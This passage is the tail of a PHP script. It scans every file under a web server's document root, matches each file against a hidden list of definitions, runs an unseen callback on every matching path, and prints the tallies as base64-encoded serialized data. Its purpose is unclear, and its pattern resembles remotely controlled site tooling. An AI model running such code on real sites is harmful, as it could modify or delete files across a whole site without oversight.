    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();
